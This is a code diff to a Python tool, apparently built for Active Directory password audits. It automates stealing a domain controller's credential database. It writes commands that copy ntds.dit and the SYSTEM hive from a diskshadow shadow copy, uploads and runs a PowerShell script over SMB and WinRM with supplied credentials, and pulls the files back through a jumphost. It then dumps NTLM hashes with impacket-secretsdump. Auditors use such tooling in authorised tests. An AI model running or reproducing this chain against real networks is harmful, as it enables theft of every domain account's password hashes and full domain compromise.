@@ -417,7 +417,8 @@ $outputFile = "C:\Windows\Temp\diskshadow_output.txt"
     
 echo 'copy z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit' | out-file C:\Windows\Temp\cop.cmd -encoding ascii
 echo 'copy z:\Windows\System32\config\SYSTEM C:\Windows\Temp\copy-system.hive' | out-file C:\Windows\Temp\cop.cmd -encoding ascii -append
-echo 'reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive"' | out-file C:\Windows\Temp\cop.cmd -encoding ascii -append
+
+# echo 'reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive"' | out-file C:\Windows\Temp\cop.cmd -encoding ascii -append
     
 # Run DiskShadow with script and capture output
 diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
@@ -443,11 +444,15 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
 
         # print(command1)color_text("\nAll systems go! All requirements are met.", Color.GREEN, BOLD, END, yellow)
         print(color_text('\nUploading audit.ps1 file to the target.\n', Color.BOLD))
-        cp_audit = run_ssh_command(jh, command1)
-        if '[-]' in cp_audit[1]:
-            print(color_text('Credentials are not working. This is the netexec output:\n\n', Color.RED), cp_audit[1])
-            # print(cp_audit[1])
-            exit()
+
+        command12 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'put audit.ps1 Windows/Temp/audit.ps1'"
+
+        cp_audit = run_ssh_command(jh, command12)
+        time.sleep(1)
+        # if '[-]' in cp_audit[1]:
+        #     print(color_text('Credentials are not working. This is the netexec output:\n\n', Color.RED), cp_audit[1])
+        #     # print(cp_audit[1])
+        #     exit()
         
         command2 =  "nxc winrm "+dc_ip+" -u '"+user+"' -p '"+password+r"' -X 'C:\Windows\Temp\audit.ps1'"
         
@@ -457,34 +462,44 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
             print(command2)
             print(run_audit[1])
 
-        command31 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\SYSTEM.hive SYSTEM.hive"
-        command32 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\copy-system.hive copy-system.hive"
-        command33 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\ntds.dit ntds.dit"
+        #command31 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\SYSTEM.hive ntds-dump\SYSTEM.hive"
+        # command32 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\copy-system.hive ntds-dump\\copy-system.hive"
+        command322 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/copy-system.hive ntds-dump/copy-system.hive'"
+        # command33 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\ntds.dit ntds-dump\\ntds.dit"
+        command333 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/ntds.dit ntds-dump/ntds.dit'"
 
         print('diskshadow done, grabbing files over on the jumphost')
-        jh_grab_audit1 = run_ssh_command(jh, command31)
-        jh_grab_audit2 = run_ssh_command(jh, command32)
-        jh_grab_audit3 = run_ssh_command(jh, command33)
+        #jh_grab_audit1 = run_ssh_command(jh, command31)
+        jh_grab_audit2 = run_ssh_command(jh, command322)
+        jh_grab_audit3 = run_ssh_command(jh, command333)
         if verbose:
-            print(command31,'\n', command32, '\n',command33,'\n')
-            print(jh_grab_audit1[1], '\n', jh_grab_audit2[1], '\n', jh_grab_audit3[1], '\n')
+            print(command322, '\n',command333,'\n')
+            print('\n', jh_grab_audit2[1], '\n', jh_grab_audit3[1], '\n')
         
         # create local directory
-        create_local_dir = ['mkdir', f'password-audit']
+        create_local_dir = ['mkdir', 'password-audit']
         create = subprocess.run(create_local_dir, capture_output=True, text=True)
 
         print('grabbing files over from jumphost')
-        grab_audit1 = copy_files(f'{jh}:~/ntds.dit', 'password-audit/.')
-        grab_audit2 = copy_files(f'{jh}:~/copy-system.hive', 'password-audit/.')
-        grab_audit3 = copy_files(f'{jh}:~/SYSTEM.hive', 'password-audit/.')   
+        grab_audit1 = copy_files(f'{jh}:~/ntds-dump/ntds.dit', 'password-audit/.')
+        grab_audit2 = copy_files(f'{jh}:~/ntds-dump/copy-system.hive', 'password-audit/.')
+        # grab_audit3 = copy_files(f'{jh}:~/SYSTEM.hive', 'password-audit/.')   
 
         print('Grabbing enabled users and high priv users. If fails only run users module.')
         users = en_users(jh, dc_ip, user, password, domain)
 
         print('Everything seemed to work well. Now you have the necessary files to perform your password audit.')        
 
-        
-        # print('jumphost provided')
+        if is_tool_installed('impacket-secretsdump'):
+            print('\nDumping the ntlm hashes using impacket-secretsdump.')
+            command = ['impacket-secretsdump', '-system', 'password-audit/copy-system.hive', '-ntds', 'password-audit/ntds.dit', 'LOCAL', '-outputfile', 'ntlm-dumps']
+            running = subprocess.run(command, capture_output=True, text=True)
+            print('\nNtlm hashes dumped!')
+        if is_tool_installed('secretsdump.py'):
+            print('\nDumping the ntlm hashes using secretsdump.py.')
+            command = ['secretsdump.py', '-system', 'password-audit/copy-system.hive', '-ntds', 'password-audit/ntds.dit', 'LOCAL', '-outputfile', 'ntlm-dumps']
+            running = subprocess.run(command, capture_output=True, text=True)
+            print('\nNtlm hashes dumped!')
 
     else:
         print('jumphost not provided, this side of the module is not ready yet.')
@@ -494,10 +509,14 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
 
     
 
+def is_tool_installed(tool):
+    try:
+        if subprocess.run(['which', tool], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, check=True).returncode == 0:
+            return True
+        return False
+    except:
+        return False
 
-
-
-    None
     
 def main():
     parser = argparse.ArgumentParser(description="Run nmap scan in tmux on remote host")
